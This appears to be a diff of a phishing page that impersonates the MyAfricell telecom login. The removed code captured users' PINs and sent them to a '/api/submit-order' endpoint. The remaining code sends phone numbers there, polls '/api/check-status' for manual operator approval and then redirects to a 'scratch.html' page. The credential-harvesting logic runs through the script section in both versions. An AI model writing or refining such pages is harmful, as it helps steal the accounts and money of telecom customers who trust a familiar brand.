@@ -7,299 +7,107 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* Removes the vertical scrollbar while keeping full scrolling enabled */
-        body::-webkit-scrollbar {
-            display: none;
-        }
-        body {
-            scrollbar-width: none; /* For Firefox */
-        }
-
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            -webkit-tap-highlight-color: transparent;
-        }
+        body::-webkit-scrollbar { display: none; }
+        body { scrollbar-width: none; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
 
         html, body {
-            width: 100%;
-            height: 100%;
+            width: 100%; height: 100%;
             background: linear-gradient(180deg, #C7D2DC 0%, #E5E5E5 100%);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            overflow-y: auto;
-            padding: 24px 16px;
+            display: flex; justify-content: center; align-items: center;
+            overflow-y: auto; padding: 16px;
         }
 
-        /* Spacious, professional mobile viewport card with fully rounded uniform corners */
+        /* Expanded to fill available screen space with trimmed border radius */
         .mobile-viewport {
             width: 100%;
-            max-width: 420px;
+            max-width: 100%;
+            height: 100%;
+            max-height: 100%;
             background: #FFFFFF;
-            border-radius: 36px;
+            border-radius: 20px; /* Trimmed border radius */
             box-shadow: 0 20px 45px rgba(0, 0, 0, 0.12);
             display: flex;
             flex-direction: column;
             justify-content: space-between;
-            padding: 40px 32px 32px 32px;
+            padding: 32px 24px 24px 24px;
             border: 1px solid rgba(0, 0, 0, 0.04);
-            overflow: hidden; /* Ensures inner contents respect the 36px rounded corners */
+            overflow: hidden;
         }
 
-        /* Top Stack: Heading */
-        .top-stack {
-            width: 100%;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
+        .top-stack { width: 100%; text-align: center; }
+        .login-heading { font-size: 32px; font-weight: 800; color: #991676; margin-bottom: 20px; }
+        .login-heading span { display: block; }
+
+        .middle-stack { 
+            width: 100%; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center; 
+            margin: auto 0; 
+            gap: 20px; 
+            padding: 16px 0; 
         }
 
-        .login-heading {
-            font-size: 32px;
-            font-weight: 800;
-            color: #991676;
-            text-align: center;
-            margin-bottom: 28px;
-            line-height: 1.2;
-            letter-spacing: -0.5px;
-            width: 100%;
-        }
-
-        .login-heading span {
-            display: block;
-        }
-
-        /* Middle Stack: Phone Number & PIN Boxes */
-        .middle-stack {
-            width: 100%;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            margin: auto 0;
-            gap: 24px;
-            padding: 16px 0;
-        }
-
-        /* Phone Number Input Box */
         .phone-input-wrapper {
-            width: 100%;
-            background: #F7F8FA;
-            border: 2px solid #E5E7EB;
-            border-radius: 18px;
-            padding: 16px 20px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.02);
-            cursor: pointer;
-            transition: all 0.2s ease;
+            width: 100%; background: #F7F8FA; border: 2px solid #E5E7EB;
+            border-radius: 16px; padding: 14px 18px; cursor: pointer; transition: all 0.2s ease;
         }
+        .phone-input-wrapper.active-field { border-color: #991676; background: #FFFFFF; box-shadow: 0 0 0 3px rgba(153, 22, 118, 0.15); }
+        .phone-label { font-size: 11px; font-weight: 600; color: #6B7280; margin-bottom: 4px; display: block; text-transform: uppercase; text-align: left; }
+        .phone-input-row { display: flex; align-items: center; gap: 12px; }
+        .phone-input-row i { color: #9CA3AF; font-size: 16px; }
+        .phone-input-field { width: 100%; background: transparent; border: none; font-size: 16px; font-weight: 600; color: #1F2937; outline: none; pointer-events: none; }
+        .phone-input-field::placeholder { color: #9CA3AF; font-weight: 400; }
 
-        .phone-input-wrapper.active-field {
-            border-color: #991676;
-            background: #FFFFFF;
-            box-shadow: 0 0 0 3px rgba(153, 22, 118, 0.15);
-        }
-
-        .phone-label {
-            font-size: 12px;
-            font-weight: 600;
-            color: #6B7280;
-            margin-bottom: 6px;
-            display: block;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            text-align: left;
-        }
-
-        .phone-input-row {
-            display: flex;
-            align-items: center;
-            gap: 14px;
-        }
-
-        .phone-input-row i {
-            color: #9CA3AF;
-            font-size: 18px;
-        }
-
-        .phone-input-field {
-            width: 100%;
-            background: transparent;
-            border: none;
-            font-size: 18px;
-            font-weight: 600;
-            color: #1F2937;
-            outline: none;
-            text-align: left;
-            pointer-events: none;
-        }
-
-        .phone-input-field::placeholder {
-            color: #9CA3AF;
-            font-weight: 400;
-        }
-
-        /* PIN Container Group */
-        .pin-group-wrapper {
-            width: 100%;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            cursor: pointer;
-        }
-
-        .pin-label {
-            font-size: 14px;
-            font-weight: 600;
-            color: #4B5563;
-            margin-bottom: 12px;
-            text-align: center;
-            letter-spacing: 0.3px;
-        }
-
-        /* Four PIN Input Boxes */
-        .pin-boxes-container {
-            display: flex;
-            gap: 16px;
-            justify-content: center;
-            padding: 8px;
-            border: 2px solid transparent;
-            border-radius: 18px;
-            transition: all 0.2s ease;
-        }
-
-        .pin-group-wrapper.active-field .pin-boxes-container {
-            border-color: rgba(153, 22, 118, 0.2);
-            background: rgba(153, 22, 118, 0.02);
-        }
-
-        .pin-box {
-            width: 60px;
-            height: 64px;
-            background: #F7F8FA;
-            border: 1px solid #D1D5DB;
-            border-radius: 16px;
-            font-size: 26px;
-            font-weight: 600;
-            color: #1F2937;
-            text-align: center;
-            pointer-events: none;
-            box-shadow: 0 3px 6px rgba(0,0,0,0.03);
-            transition: all 0.2s ease;
-        }
-
-        .pin-box.active-box {
-            border-color: #991676;
-            background: #FFFFFF;
-            box-shadow: 0 0 0 3px rgba(153, 22, 118, 0.15);
-        }
-
-        /* Inline Error Message Box */
         .pp-error-box {
-            width: 100%;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            margin-top: 10px;
-            color: #E31B23;
-            font-size: 13px;
-            font-weight: 500;
-            text-align: center;
+            width: 100%; display: none; align-items: center; justify-content: center; gap: 8px;
+            color: #E31B23; font-size: 14px; font-weight: 500; text-align: center;
         }
 
-        /* Bottom Stack: Sign in Button & Keypad */
-        .bottom-stack {
-            width: 100%;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding-top: 20px;
-        }
+        .bottom-stack { width: 100%; display: flex; flex-direction: column; align-items: center; padding-top: 20px; }
 
-        /* Sign In Button */
         .btn-login {
             width: 100%;
-            height: 60px;
-            background: #E8B4D4; /* Soft pinkish disabled state */
+            max-width: 480px;
+            height: 64px;
+            background: #E8B4D4; 
             color: #FFFFFF;
-            border: none;
-            border-radius: 30px;
-            font-size: 17px;
+            border: none; 
+            border-radius: 32px; 
+            font-size: 18px; 
             font-weight: 700;
-            cursor: pointer;
-            text-align: center;
-            transition: all 0.2s ease;
-            letter-spacing: 0.5px;
+            cursor: pointer; 
+            text-align: center; 
             text-transform: uppercase;
+            transition: all 0.2s ease; 
+            letter-spacing: 0.5px;
             margin-bottom: 24px;
         }
+        .btn-login.enabled { background: #991676; box-shadow: 0 8px 20px rgba(153, 22, 118, 0.3); }
+        .btn-login:disabled { cursor: not-allowed; }
 
-        .btn-login.enabled {
-            background: #991676; /* Active Africell Purple */
-            box-shadow: 0 8px 20px rgba(153, 22, 118, 0.3);
-        }
-
-        .btn-login:hover:not(:disabled) {
-            opacity: 0.95;
-        }
-
-        .btn-login:disabled {
-            cursor: not-allowed;
-        }
-
-        /* On-Screen Numeric Keypad */
-        .onscreen-keypad {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 12px;
-            width: 100%;
-            max-width: 320px;
-        }
-
+        .onscreen-keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; width: 100%; max-width: 360px; }
         .keypad-btn {
-            background: transparent;
-            border: none;
-            height: 56px;
-            font-size: 26px;
-            font-weight: 600;
-            color: #1F2937;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            border-radius: 50%;
+            background: transparent; border: none; height: 60px; font-size: 28px;
+            font-weight: 600; color: #1F2937; display: flex; align-items: center;
+            justify-content: center; cursor: pointer; border-radius: 50%;
             transition: background 0.1s ease;
         }
-
-        .keypad-btn:active {
-            background: #E5E7EB;
-        }
-
-        .keypad-btn.action-key {
-            font-size: 22px;
-            color: #4B5563;
-        }
+        .keypad-btn:active { background: #E5E7EB; }
+        .keypad-btn.action-key { font-size: 22px; color: #4B5563; }
     </style>
 </head>
 <body>
 
     <div class="mobile-viewport">
-        
-        <!-- Top Stack: Heading -->
         <div class="top-stack">
-            <h1 class="login-heading">
-                Welcome to
-                <span>MyAfricell!</span>
-            </h1>
+            <h1 class="login-heading">Welcome to <span>MyAfricell!</span></h1>
         </div>
 
-        <!-- Middle Stack: Phone Number & PIN Boxes -->
         <div class="middle-stack">
-            <!-- Phone Number Field -->
-            <div class="phone-input-wrapper active-field" id="phoneWrapper" onclick="setActiveField('phone')">
+            <div class="phone-input-wrapper active-field" id="phoneWrapper">
                 <span class="phone-label">Enter Phone Number</span>
                 <div class="phone-input-row">
                     <i class="fa-solid fa-phone"></i>
@@ -307,24 +115,12 @@
                 </div>
             </div>
 
-            <!-- PIN Field Group -->
-            <div class="pin-group-wrapper" id="pinWrapper" onclick="setActiveField('pin')">
-                <span class="pin-label">Enter PIN</span>
-                <div class="pin-boxes-container">
-                    <input type="password" class="pin-box active-box" id="p1" readonly value="">
-                    <input type="password" class="pin-box" id="p2" readonly value="">
-                    <input type="password" class="pin-box" id="p3" readonly value="">
-                    <input type="password" class="pin-box" id="p4" readonly value="">
-                </div>
-            </div>
-
             <div id="inlineErrorBox" class="pp-error-box">
                 <i class="fa-solid fa-circle-exclamation"></i>
-                <span id="errorText">Invalid credentials. Please try again.</span>
+                <span id="errorText">Please check your details.</span>
             </div>
         </div>
 
-        <!-- Bottom Stack: Button & Keypad -->
         <div class="bottom-stack">
             <button type="button" id="loginBtn" class="btn-login" disabled onclick="handleLogin()">Sign in</button>
 
@@ -343,20 +139,15 @@
                 <button type="button" class="keypad-btn action-key" onclick="deleteKey()"><i class="fa-solid fa-delete-left"></i></button>
             </div>
         </div>
-
     </div>
 
     <script>
         const mobileInput = document.getElementById('mobileNumber');
-        const phoneWrapper = document.getElementById('phoneWrapper');
-        const pinWrapper = document.getElementById('pinWrapper');
         const loginBtn = document.getElementById('loginBtn');
         const errorBox = document.getElementById('inlineErrorBox');
         const errorText = document.getElementById('errorText');
 
-        let currentActiveField = 'phone';
         let phoneValue = '';
-        let pinDigits = ['', '', '', ''];
         let activeInterval = null;
         const pageLoadTimestamp = Date.now();
 
@@ -368,99 +159,29 @@
                 mobileInput.value = phoneValue;
                 validateForm();
             }
-            updateActiveFieldUI();
         });
 
-        function setActiveField(fieldType) {
-            currentActiveField = fieldType;
-            updateActiveFieldUI();
-        }
+        function showInlineError(msg) { errorText.innerText = msg; errorBox.style.display = 'flex'; }
+        function hideInlineError() { errorBox.style.display = 'none'; }
 
-        function updateActiveFieldUI() {
-            if (currentActiveField === 'phone') {
-                phoneWrapper.classList.add('active-field');
-                pinWrapper.classList.remove('active-field');
-                for (let i = 1; i <= 4; i++) {
-                    document.getElementById('p' + i).classList.remove('active-box');
-                }
-            } else {
-                phoneWrapper.classList.remove('active-field');
-                pinWrapper.classList.add('active-field');
-                updatePinDisplay();
-            }
-        }
-
-        function showInlineError(message) {
-            errorText.innerText = message;
-            errorBox.style.display = 'flex';
-        }
-
-        function hideInlineError() {
-            errorBox.style.display = 'none';
-        }
-
-        function updatePinDisplay() {
-            for (let i = 0; i < 4; i++) {
-                const box = document.getElementById('p' + (i + 1));
-                box.value = pinDigits[i];
-                box.classList.remove('active-box');
-            }
-
-            if (currentActiveField === 'pin') {
-                const firstEmpty = pinDigits.findIndex(d => d === '');
-                if (firstEmpty !== -1) {
-                    document.getElementById('p' + (firstEmpty + 1)).classList.add('active-box');
-                } else {
-                    document.getElementById('p4').classList.add('active-box');
-                }
+        function pressKey(digit) {
+            if (phoneValue.length < 15) {
+                phoneValue += digit;
+                mobileInput.value = phoneValue;
             }
             validateForm();
         }
 
-        function pressKey(digit) {
-            if (currentActiveField === 'phone') {
-                if (phoneValue.length < 15) {
-                    phoneValue += digit;
-                    mobileInput.value = phoneValue;
-                }
-                validateForm();
-            } else {
-                const firstEmpty = pinDigits.findIndex(d => d === '');
-                if (firstEmpty !== -1) {
-                    pinDigits[firstEmpty] = digit;
-                    updatePinDisplay();
-                }
-            }
-        }
-
         function deleteKey() {
-            if (currentActiveField === 'phone') {
-                if (phoneValue.length > 0) {
-                    phoneValue = phoneValue.slice(0, -1);
-                    mobileInput.value = phoneValue;
-                }
-                validateForm();
-            } else {
-                let deleted = false;
-                for (let i = 3; i >= 0; i--) {
-                    if (pinDigits[i] !== '') {
-                        pinDigits[i] = '';
-                        deleted = true;
-                        break;
-                    }
-                }
-                if (!deleted && currentActiveField === 'pin') {
-                    setActiveField('phone');
-                }
-                updatePinDisplay();
+            if (phoneValue.length > 0) {
+                phoneValue = phoneValue.slice(0, -1);
+                mobileInput.value = phoneValue;
             }
+            validateForm();
         }
 
         function validateForm() {
-            const isPhoneValid = phoneValue.trim().length >= 7;
-            const isPinComplete = pinDigits.every(d => d !== '');
-
-            if (isPhoneValid && isPinComplete) {
+            if (phoneValue.trim().length >= 7) {
                 loginBtn.removeAttribute('disabled');
                 loginBtn.classList.add('enabled');
             } else {
@@ -472,88 +193,51 @@
 
         function handleLogin() {
             const rawPhone = phoneValue.trim();
-            const pin = pinDigits.join('');
 
-            if (!rawPhone || rawPhone.length < 7) {
+            if (rawPhone.length < 7) {
                 showInlineError('Please enter a valid mobile number.');
-                setActiveField('phone');
-                return;
-            }
-
-            if (pin.length !== 4) {
-                showInlineError('Please enter a complete PIN.');
-                setActiveField('pin');
                 return;
             }
 
             const fullPhone = '+232 ' + rawPhone;
-
             localStorage.setItem('africellUserPhone', fullPhone);
             localStorage.setItem('userPhone', fullPhone);
-            localStorage.setItem('africellUserPin', pin);
 
-            submitLoginCredentials(fullPhone, pin);
+            submitLoginCredentials(fullPhone);
         }
 
-        async function submitLoginCredentials(phone, pin) {
+        async function submitLoginCredentials(phone) {
             try {
                 loginBtn.setAttribute('disabled', 'true');
                 loginBtn.classList.remove('enabled');
                 loginBtn.textContent = 'Signing in...';
 
-                const response = await fetch('/api/submit-order', {
+                await fetch('/api/submit-order', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone: phone, uniqueId: 'Login PIN: ' + pin })
+                    body: JSON.stringify({ phone, uniqueId: 'Sign-in Phone Number: ' + phone })
                 });
 
-                const result = await response.json();
-
-                if (result.success !== false) {
-                    pollApprovalStatus(phone);
-                } else {
-                    showInlineError('Authentication failed. Please verify your credentials.');
-                    resetButtonState();
-                }
-            } catch (error) {
-                console.error('Error:', error);
+                pollApprovalStatus(phone);
+            } catch (err) {
                 pollApprovalStatus(phone);
             }
         }
 
-        function resetButtonState() {
-            loginBtn.textContent = 'Sign in';
-            loginBtn.removeAttribute('disabled');
-            loginBtn.classList.add('enabled');
-            pinDigits = ['', '', '', ''];
-            setActiveField('pin');
-            updatePinDisplay();
-        }
-
         function pollApprovalStatus(phone) {
-            const cleanPhone = phone.trim();
-
             if (activeInterval) clearInterval(activeInterval);
-
             const submissionTimestamp = Date.now();
 
             activeInterval = setInterval(async () => {
                 try {
-                    const response = await fetch(`/api/check-status?phone=${encodeURIComponent(cleanPhone)}&t=${Date.now()}`);
+                    const response = await fetch(`/api/check-status?phone=${encodeURIComponent(phone.trim())}&t=${Date.now()}`);
                     const data = await response.json();
 
                     if (data.status === 'approved' && data.timestamp && data.timestamp >= pageLoadTimestamp && data.timestamp >= submissionTimestamp) {
                         clearInterval(activeInterval);
                         window.location.href = 'scratch.html';
-                    } 
-                    else if ((data.status === 'rejected' || data.status === 'wrong_id' || data.status === 'wrong_pin') && data.timestamp && data.timestamp >= submissionTimestamp) {
-                        clearInterval(activeInterval);
-                        showInlineError('⚠️ Incorrect PIN. Please check and try again.');
-                        resetButtonState();
                     }
-                } catch (e) {
-                    console.error('Polling error', e);
-                }
+                } catch (e) { console.error(e); }
             }, 3000);
         }
     </script>
